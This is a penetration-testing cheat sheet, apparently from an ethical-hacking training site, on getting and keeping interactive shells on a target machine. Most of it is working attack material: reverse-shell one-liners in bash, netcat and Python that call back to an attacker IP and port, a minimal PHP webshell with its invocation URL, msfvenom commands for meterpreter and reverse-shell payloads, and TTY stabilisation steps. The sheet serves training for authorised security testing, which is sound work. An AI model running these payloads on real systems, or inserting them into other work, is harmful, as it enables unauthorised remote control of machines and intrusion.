---
title: "Shells"
ShowToc: true
TocOpen: false
build:
  list: never
---

[← Cheat Sheets](../) · {{< download "/dl/cheatsheets/04_shells-for-the-ethical-hacker.md" "Download this sheet (.md)" >}}


> Turn "I can run commands on the target" into "I have an interactive shell."
> The listener always runs on **your attacker box**; the target connects back
> to you (reverse), or you connect in (bind).

## Shell Types

| shell type | who listens | who connects | notes |
| ---------- | ----------- | ------------ | ----- |
| **reverse** | attacker | target → attacker | the standard; outbound from the target looks less suspicious |
| **bind** | target | attacker → target | needs an inbound-reachable target port |
| **webshell** | — | — | half-interactive; run commands via a web app, output on the page |

## Know Your Own IP

> to build a reverse-shell payload you need YOUR attacker IP and a listening port.

| command | usage |
| ------- | ----- |
| `ip -br a` | your interfaces / IPs (short) |
| `ip a` | full interface details |

> the target calls back to `<your-ip>:<port>`.

## Catching a Reverse Shell

> run the listener on your attacker box:

```
nc -lnvp <port>
```

| flag | usage |
| ---- | ----- |
| `-l` | listen for an incoming connection |
| `-n` | no DNS resolution |
| `-v` | verbose |
| `-p <port>` | port to listen on |

> pick a port you control (e.g. 4444, 9001); the payload must point at this same port.

## Creating Reverse Shells

> best resource: **https://revshells.com** — set your IP + port, pick a payload,
> copy-paste. Offers reverse / bind / webshell / msfvenom variants and a matching listener.

| one-liner (run on target) | note |
| ------------------------- | ---- |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | bash reverse shell |
| `nc <ip> <port> -e /bin/bash` | nc with `-e` (if supported) |
| `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'` | python reverse shell |

> if one variant silently fails, try another — behavior differs by target shell/tooling.

## Webshells

| item | usage |
| ---- | ----- |
| `<?php system($_GET['cmd']); ?>` | minimal PHP webshell (worth memorizing) |
| `http://<target>/<path>/shell.php?cmd=whoami` | invoke it |
| `webshells` | list bundled webshells (`/usr/share/webshells/`) |

> bundled languages: asp, aspx, cfm, jsp, perl, php, ...

## msfvenom (payload generator)

```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
```

| example | note |
| ------- | ---- |
| `-p php/meterpreter_reverse_tcp ... -f raw -o shell.php` | PHP meterpreter |
| `-p cmd/unix/reverse_bash ... -f raw -o shell.sh` | bash reverse |
| `-p windows/meterpreter/reverse_tcp ... -f exe -o shell.exe` | Windows exe |

> `LHOST`/`LPORT` = your attacker IP/port (the listener). Shines for Windows payloads.

## Stabilizing a Shell (Linux)

> a raw `nc` shell is not a TTY: no line editing, no history, CTRL+C kills it.
> upgrade it to a usable (PTY) shell:

| step | where | command |
| ---- | ----- | ------- |
| 1. spawn PTY | target | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| (alt) | target | `perl -e 'exec "/bin/bash";'` |
| 2. background | attacker | press `CTRL+Z` |
| 3. raw mode + resume | attacker | `stty raw -echo; fg` then Enter |
| 4. set terminal type | target | `export TERM=xterm-256color` |
| 5. fix size (optional) | target | `stty rows <N> cols <M>` |

> get your real size on the attacker with `stty -a` (look for rows/columns).
> `stty raw -echo` passes keystrokes straight through (CTRL+C now reaches the target).

## Stabilizing a Shell (Windows)

> Windows shells are flaky; wrap your listener with `rlwrap` for history/line editing.

```
sudo apt install rlwrap -y
rlwrap nc -lnvp <port>
```

## Quick Recovery

| problem | fix |
| ------- | --- |
| shell froze after CTRL+Z didn't resume | type `reset` and Enter |
| garbled / no newlines | redo `export TERM=xterm-256color` and the `stty` size step |
| CTRL+C killed your whole shell | you forgot `stty raw -echo` — stabilize before working |

## General Tips

- The listener is always on **your** box; the payload always points back at you.
- Stabilize the shell **before** doing real work, so CTRL+C doesn't kill it.
- If a one-liner fails silently, switch languages (bash → python → nc) — tooling varies.
- Keep `revshells.com` open; it generates both the payload and the matching listener.
- Note your IP/port once and reuse them consistently to avoid mismatches.
